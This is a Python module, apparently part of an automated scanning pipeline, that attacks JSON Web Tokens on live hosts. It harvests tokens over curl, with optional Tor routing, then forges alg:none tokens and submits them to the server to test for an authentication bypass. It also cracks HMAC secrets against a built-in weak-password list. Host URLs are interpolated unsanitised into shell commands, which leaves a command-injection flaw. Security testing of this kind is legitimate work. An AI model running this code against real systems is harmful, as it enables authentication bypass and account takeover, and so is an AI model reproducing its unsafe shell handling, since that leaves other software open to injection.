#!/usr/bin/env python3
# modules/step19_jwt.py — JWT Analysis: alg:none, weak secret, alg confusion
import os, base64, json, hashlib, hmac
from core.utils import safe_read

class JWTStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    WEAK_SECRETS = [
        "secret","password","123456","admin","test","key","jwt",
        "secret123","qwerty","letmein","token","auth","change_me",
        "your-256-bit-secret","your-secret-key","mysecret","default",
    ]

    def run(self):
        urls = self.f["live_hosts"]
        out  = self.f["jwt_results"]
        found = 0

        # Collect JWTs from HTTP responses
        jwts_found = self._harvest_jwts(urls)

        if not jwts_found:
            self.log.warn("JWT: no tokens found in responses")
            return

        for jwt, source_url in jwts_found:
            # Decode and analyze
            issues = self._analyze(jwt, source_url)
            for issue in issues:
                with open(out,"a") as f:
                    f.write(f"{issue['type']}: {source_url} | {issue['detail']}\n")
                self.p.add_finding(issue["sev"], issue["type"],
                                   source_url, issue["detail"], "jwt-engine")
                found += 1

        self.log.success(f"JWT: {found} issues found")

    def _harvest_jwts(self, live_file):
        """Extract JWTs from response headers and bodies."""
        import re
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')
        results = []
        for url in safe_read(live_file)[:30]:
            resp = self.p.shell(
                f"curl -sk -D - --connect-timeout 5 '{url}' 2>/dev/null",
                use_tor=bool(self.p.tor))
            tokens = jwt_pattern.findall(resp)
            for t in tokens:
                results.append((t, url))
        return results[:20]

    def _analyze(self, jwt, url):
        issues = []
        try:
            parts = jwt.split(".")
            if len(parts) != 3:
                return issues

            # Decode header
            header_b64  = parts[0] + "=="
            payload_b64 = parts[1] + "=="
            header  = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            alg = header.get("alg","").upper()

            # 1. Algorithm none
            if alg == "NONE":
                issues.append({"sev":"critical","type":"JWT_ALG_NONE",
                                "detail":"Algorithm is 'none' — token not verified"})

            # 2. Test alg:none bypass
            forged = self._forge_alg_none(parts[0], parts[1])
            test_result = self._test_jwt(url, forged)
            if test_result:
                issues.append({"sev":"critical","type":"JWT_ALG_NONE_BYPASS",
                                "detail":"Server accepts alg:none forged token"})

            # 3. Weak secret brute force (HS256/HS384/HS512)
            if alg.startswith("HS"):
                cracked = self._brute_force(jwt, alg)
                if cracked:
                    issues.append({"sev":"critical","type":"JWT_WEAK_SECRET",
                                   "detail":f"Cracked secret: '{cracked}'"})

            # 4. RS256 → HS256 confusion
            if alg == "RS256":
                issues.append({"sev":"high","type":"JWT_RS256_DETECTED",
                                "detail":"RS256 — test alg confusion manually"})

            # 5. exp check
            exp = payload.get("exp")
            if not exp:
                issues.append({"sev":"medium","type":"JWT_NO_EXPIRY",
                                "detail":"Token has no expiration (exp claim missing)"})

        except Exception:
            pass
        return issues

    def _forge_alg_none(self, header_b64, payload_b64):
        """Forge a token with alg:none."""
        try:
            header = json.loads(base64.urlsafe_b64decode(header_b64+"=="))
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
            return f"{new_header}.{payload_b64}."
        except Exception:
            return ""

    def _test_jwt(self, url, forged_jwt):
        """Test if server accepts forged JWT."""
        if not forged_jwt: return False
        result = self.p.shell(
            f"curl -sk --connect-timeout 5 "
            f"-H 'Authorization: Bearer {forged_jwt}' "
            f"'{url}' -o /dev/null -w '%{{http_code}}'")
        return result.strip() in ("200","201","204")

    def _brute_force(self, jwt, alg):
        """HMAC brute force against common weak secrets."""
        parts   = jwt.split(".")
        message = f"{parts[0]}.{parts[1]}".encode()
        sig_b64 = parts[2] + "=="
        try:
            signature = base64.urlsafe_b64decode(sig_b64)
        except Exception:
            return None

        hash_map = {"HS256":hashlib.sha256,"HS384":hashlib.sha384,"HS512":hashlib.sha512}
        h_func = hash_map.get(alg, hashlib.sha256)

        for secret in self.WEAK_SECRETS:
            try:
                computed = hmac.new(secret.encode(), message, h_func).digest()
                if hmac.compare_digest(computed, signature):
                    return secret
            except Exception:
                pass
        return None
